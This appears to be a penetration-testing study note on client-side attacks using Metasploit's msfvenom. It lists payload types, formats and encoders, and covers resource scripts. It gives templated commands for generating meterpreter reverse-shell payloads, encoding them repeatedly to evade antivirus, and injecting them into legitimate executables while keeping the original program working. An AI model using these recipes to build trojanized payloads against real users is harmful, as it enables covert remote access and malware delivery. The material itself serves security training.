[[msfvenom]]
- Client side attacks
	- A client side attack is an attack vector that involves coercing a client to execute a malicious payload on their system that consequently connects back to the attacker when executed
	- Client side attacks typically utilize various social engineering techniques like generating malicious documents or portable executables (PEs)
	- Client side attacks take advantage of human vulnerabilities as opposed to vulnerabilities in services or software running on the target system
	- Given than this attack vector involves the transfer and storage of a malicious payload on the client's systems (disk), attackers need to be cognisant of AV detection
- Msfvenom
	- msfvenom is a command line utility that can be used to generate and encode msf payloads for various operating systems as well as web servers
	- msfvenom is a combination of two utilities, namely msfpayload and msfencode
	- We can use msfvenom to generate a malicious meterpreter payload that can be transferred to a client target system. Once executed it will connect back to our payload handler and provide us with remote access to the target system.

```
┌──(kali㉿kali)-[~]
└─$ msfvenom  
Error: No options
MsfVenom - a Metasploit standalone payload generator.
Also a replacement for msfpayload and msfencode.
Usage: /usr/bin/msfvenom [options] <var=val>
Example: /usr/bin/msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> -f exe -o payload.exe

Options:
    -l, --list            <type>     List all modules for [type]. Types are: payloads, encoders, nops, platforms, archs, encrypt, formats, all
    -p, --payload         <payload>  Payload to use (--list payloads to list, --list-options for arguments). Specify '-' or STDIN for custom
        --list-options               List --payload <value>'s standard, advanced and evasion options
    -f, --format          <format>   Output format (use --list formats to list)
    -e, --encoder         <encoder>  The encoder to use (use --list encoders to list)
        --service-name    <value>    The service name to use when generating a service binary
        --sec-name        <value>    The new section name to use when generating large Windows binaries. Default: random 4-character alpha string
        --smallest                   Generate the smallest possible payload using all available encoders
        --encrypt         <value>    The type of encryption or encoding to apply to the shellcode (use --list encrypt to list)
        --encrypt-key     <value>    A key to be used for --encrypt
        --encrypt-iv      <value>    An initialization vector for --encrypt
    -a, --arch            <arch>     The architecture to use for --payload and --encoders (use --list archs to list)
        --platform        <platform> The platform for --payload (use --list platforms to list)
    -o, --out             <path>     Save the payload to a file
    -b, --bad-chars       <list>     Characters to avoid example: '\x00\xff'
    -n, --nopsled         <length>   Prepend a nopsled of [length] size on to the payload
        --pad-nops                   Use nopsled size specified by -n <length> as the total payload size, auto-prepending a nopsled of quantity (nops minus payload length)
    -s, --space           <length>   The maximum size of the resulting payload
        --encoder-space   <length>   The maximum size of the encoded payload (defaults to the -s value)
    -i, --iterations      <count>    The number of times to encode the payload
    -c, --add-code        <path>     Specify an additional win32 shellcode file to include
    -x, --template        <path>     Specify a custom executable file to use as a template
    -k, --keep                       Preserve the --template behaviour and inject the payload as a new thread
    -v, --var-name        <value>    Specify a custom variable name to use for certain output formats
    -t, --timeout         <second>   The number of seconds to wait when reading the payload from STDIN (default 30, 0 to disable)
    -h, --help                       Show this message

```

Staged and Unstaged payloads:

In staged payload the payload is sent in two parts where as in an unstaged payload where the payload is sent as a part of the exploit as a whole.

`msfvenom --list payloads` to see all the available payloads that we can generate with the msfvenom.

```
Framework Payloads (1385 total) [--payload <value>]
===================================================

    Name                                                               Description
    ----                                                               -----------
    aix/ppc/shell_bind_tcp                                             Listen for a connection and spawn a command shell
    aix/ppc/shell_find_port                                            Spawn a shell on an established connection
    aix/ppc/shell_interact                                             Simply execve /bin/sh (for inetd programs)
    aix/ppc/shell_reverse_tcp                                          Connect back to attacker and spawn a command shell
    android/meterpreter/reverse_http                                   Run a meterpreter server in Android. Tunnel communication over HTTP
```

As we can see it is a quite long list but for reference the above are some of them. Our primary focus of the session would be generating the payloads below.

```
windows/meterpreter/bind_tcp                               Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Listen for a connection (Windows x86)
windows/x64/meterpreter/bind_tcp                           Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Listen for a connection (Windows x64)
windows/meterpreter/reverse_tcp                            Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Connect back to the attacker
windows/x64/meterpreter/reverse_tcp                        Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Connect back to the attacker (Windows x64)
```

formats available 

```              
┌──(kali㉿kali)-[~]
└─$ msfvenom --list formats 

Framework Executable Formats [--format <value>]
===============================================

    Name
    ----
    asp
    aspx
    aspx-exe
    axis2
    dll
    ducky-script-psh
    elf
    elf-so
    exe
    exe-only
    exe-service
    exe-small
    hta-psh
    jar
    jsp
    loop-vbs
    macho
    msi
    msi-nouac
    osx-app
    psh
    psh-cmd
    psh-net
    psh-reflection
    python-reflection
    vba
    vba-exe
    vba-psh
    vbs
    war

Framework Transform Formats [--format <value>]
==============================================

    Name
    ----
    base32
    base64
    bash
    c
    csharp
    dw
    dword
    go
    golang
    hex
    java
    js_be
    js_le
    masm
    nim
    nimlang
    num
    perl
    pl
    powershell
    ps1
    py
    python
    raw
    rb
    ruby
    rust
    rustlang
    sh
    vbapplication
    vbscript
```

Encoding payloads with msfvenom
- Given that this attack vector involves the transfer and storage of a malicious payload on the client's system (disk), attackers need to be cognisant of the AV detection.
- Most end user AV solutions utilize signature based detection in order to identify malicious files or executables.
- We can evade older signature based AV solutions by encoding our payloads
- Encoding is the process of modifying the payload shellcode with the objective of modifying the payload signature.

Shell code
- Shellcode is a piece of code typically used as a payload for exploitation
- It gets its name from the term command shell, whereby shellcode is a piece of code that provides an attacker with a remote command shell on the target system.

```
┌──(kali㉿kali)-[~]
└─$ msfvenom --list encoders

Framework Encoders [--encoder <value>]
======================================

    Name                          Rank       Description
    ----                          ----       -----------
    cmd/brace                     low        Bash Brace Expansion Command Encoder
    cmd/echo                      good       Echo Command Encoder
    cmd/generic_sh                manual     Generic Shell Variable Substitution Command Encoder
    cmd/ifs                       low        Bourne ${IFS} Substitution Command Encoder
    cmd/perl                      normal     Perl Command Encoder
    cmd/powershell_base64         excellent  Powershell Base64 Command Encoder
    cmd/printf_php_mq             manual     printf(1) via PHP magic_quotes Utility Command Encoder
    generic/eicar                 manual     The EICAR Encoder
    generic/none                  normal     The "none" Encoder
    mipsbe/byte_xori              normal     Byte XORi Encoder
    mipsbe/longxor                normal     XOR Encoder
    mipsle/byte_xori              normal     Byte XORi Encoder
    mipsle/longxor                normal     XOR Encoder
    php/base64                    great      PHP Base64 Encoder
    ppc/longxor                   normal     PPC LongXOR Encoder
    ppc/longxor_tag               normal     PPC LongXOR Encoder
    ruby/base64                   great      Ruby Base64 Encoder
    sparc/longxor_tag             normal     SPARC DWORD XOR Encoder
    x64/xor                       normal     XOR Encoder
    x64/xor_context               normal     Hostname-based Context Keyed Payload Encoder
    x64/xor_dynamic               normal     Dynamic key XOR Encoder
    x64/zutto_dekiru              manual     Zutto Dekiru
    x86/add_sub                   manual     Add/Sub Encoder
    x86/alpha_mixed               low        Alpha2 Alphanumeric Mixedcase Encoder
    x86/alpha_upper               low        Alpha2 Alphanumeric Uppercase Encoder
    x86/avoid_underscore_tolower  manual     Avoid underscore/tolower
    x86/avoid_utf8_tolower        manual     Avoid UTF8/tolower
    x86/bloxor                    manual     BloXor - A Metamorphic Block Based XOR Encoder
    x86/bmp_polyglot              manual     BMP Polyglot
    x86/call4_dword_xor           normal     Call+4 Dword XOR Encoder
    x86/context_cpuid             manual     CPUID-based Context Keyed Payload Encoder
    x86/context_stat              manual     stat(2)-based Context Keyed Payload Encoder
    x86/context_time              manual     time(2)-based Context Keyed Payload Encoder
    x86/countdown                 normal     Single-byte XOR Countdown Encoder
    x86/fnstenv_mov               normal     Variable-length Fnstenv/mov Dword XOR Encoder
    x86/jmp_call_additive         normal     Jump/Call XOR Additive Feedback Encoder
    x86/nonalpha                  low        Non-Alpha Encoder
    x86/nonupper                  low        Non-Upper Encoder
    x86/opt_sub                   manual     Sub Encoder (optimised)
    x86/service                   manual     Register Service
    x86/shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback Encoder
    x86/single_static_bit         manual     Single Static Bit
    x86/unicode_mixed             manual     Alpha2 Alphanumeric Unicode Mixedcase Encoder
    x86/unicode_upper             manual     Alpha2 Alphanumeric Unicode Uppercase Encoder
    x86/xor_dynamic               normal     Dynamic key XOR Encoder
    x86/xor_poly                  normal     XOR POLY Encoder
```

The best one is shikata_ga_nai and powershell_x64.

```
msfvenom -a <architecture> -p <operatingSystem>/<archtecture>/<payload> LHOST=<attack-ip> LPORT=<connectingPort> -f <outputFormat> -o <filepath/file.fileformat>
```

We can omit the -a as we can enter the architecture in the payload

```
msfvenom -p <operatingSystem>/<archtecture>/<payload> LHOST=<attack-ip> LPORT=<connectingPort> -f <outputFormat> -o <filepath/file.fileformat>
```

Encoding

```
msfvenom -a <architecture> -p <operatingSystem>/<archtecture>/<payload> LHOST=<attack-ip> LPORT=<connectingPort> -e <encoderOfChoice> -f <outputFormat> -o <filepath/file.fileformat>
```

Encoding with the varied iterations

```
msfvenom -a <architecture> -p <operatingSystem>/<archtecture>/<payload> LHOST=<attack-ip> LPORT=<connectingPort> -i <numberOfIterations> -e <encoderOfChoice> -f <outputFormat> -o <filepath/file.fileformat>
```

```
msfvenom -a <architecture> -p <operatingSystem>/<archtecture>/<payload> LHOST=<attack-ip> LPORT=<connectingPort> --iterations <numberOfIterations> -e <encoderOfChoice> -f <outputFormat> -o <filepath/file.fileformat>
```

Encoding is a technique that we can use to avoid getting detected by any anti virus softwares

use the -x or -k flags to get that level

```
msfvenom -a <architecture> -p <operatingSystem>/<archtecture>/<payload> LHOST=<attack-ip> LPORT=<connectingPort> --iterations <numberOfIterations> -e <encoderOfChoice> -x <pathToFile> -f <outputFormat> -o <filepath/file.fileformat>
```

Using only -x flag will erase the functionality of the selected file binary or exe in order to retain the original functionality we need use the -k flag as well doing so will retain the original functionality and still inject the file with the payload

```
msfvenom -a <architecture> -p <operatingSystem>/<archtecture>/<payload> LHOST=<attack-ip> LPORT=<connectingPort> --iterations <numberOfIterations> -e <encoderOfChoice> -k -x <pathToFile> -f <outputFormat> -o <filepath/file.fileformat>
```

`run post/windows/manage/migrate`

Metasploit Resource Scripts

- Metasploit resource scripts are a great feature od MSF that allow you to automate repetitive tasks and commands
- They operate similarly to batch scripts, whereby, you can specify a set of msfconsole commands that you want to execute sequentially
- You can then load the script with the msfconsole and automate the execution of the commands you specified in the resource script
- We can use resource scripts to automate various tasks like setting up multihandlers as well as loading and executing payloads.

All the available scripts for metasploit framework:

```
┌──(kali㉿kali)-[~]
└─$ ls -la /usr/share/metasploit-framework/scripts/resource | grep rc
-rw-r--r-- 1 root root  7270 Jul 12 14:53 auto_brute.rc
-rw-r--r-- 1 root root  2203 Jul 12 14:53 autocrawler.rc
-rw-r--r-- 1 root root 11225 Jul 12 14:53 auto_cred_checker.rc
-rw-r--r-- 1 root root  6565 Jul 12 14:53 autoexploit.rc
-rw-r--r-- 1 root root  3422 Jul 12 14:53 auto_pass_the_hash.rc
-rw-r--r-- 1 root root   876 Jul 12 14:53 auto_win32_multihandler.rc
-rw-r--r-- 1 root root   155 Jul 12 14:53 bap_all.rc
-rw-r--r-- 1 root root   762 Jul 12 14:53 bap_dryrun_only.rc
-rw-r--r-- 1 root root   365 Jul 12 14:53 bap_firefox_only.rc
-rw-r--r-- 1 root root   358 Jul 12 14:53 bap_flash_only.rc
-rw-r--r-- 1 root root   354 Jul 12 14:53 bap_ie_only.rc
-rw-r--r-- 1 root root 20767 Jul 12 14:53 basic_discovery.rc
-rw-r--r-- 1 root root  4518 Jul 12 14:53 dev_checks.rc
-rw-r--r-- 1 root root  3358 Jul 12 14:53 fileformat_generator.rc
-rw-r--r-- 1 root root  1085 Jul 12 14:53 meterpreter_compatibility.rc
-rw-r--r-- 1 root root  1064 Jul 12 14:53 mssql_brute.rc
-rw-r--r-- 1 root root  4346 Jul 12 14:53 multi_post.rc
-rw-r--r-- 1 root root  1222 Jul 12 14:53 nessus_vulns_cleaner.rc
-rw-r--r-- 1 root root  1659 Jul 12 14:53 oracle_login.rc
-rw-r--r-- 1 root root   840 Jul 12 14:53 oracle_sids.rc
-rw-r--r-- 1 root root   490 Jul 12 14:53 oracle_tns.rc
-rw-r--r-- 1 root root   833 Jul 12 14:53 port_cleaner.rc
-rw-r--r-- 1 root root  2419 Jul 12 14:53 portscan.rc
-rw-r--r-- 1 root root  1251 Jul 12 14:53 run_all_post.rc
-rw-r--r-- 1 root root   333 Jul 12 14:53 run_cve-2022-22960_lpe.rc
-rw-r--r-- 1 root root  3084 Jul 12 14:53 smb_checks.rc
-rw-r--r-- 1 root root  3837 Jul 12 14:53 smb_validate.rc
-rw-r--r-- 1 root root  2592 Jul 12 14:53 wmap_autotest.rc
```

We can type out the commands into a file with `.rc` extension and use that file to run all the commands with ease. Also we can run a resource file from within the metasploit framework using the `resource` command. And incase if we are not sure about what commands we will be using we can usually run the command `makerc` from within the metasploit framework so all the commands that we used in the session will be made into a resource file and replicate all the commands and process.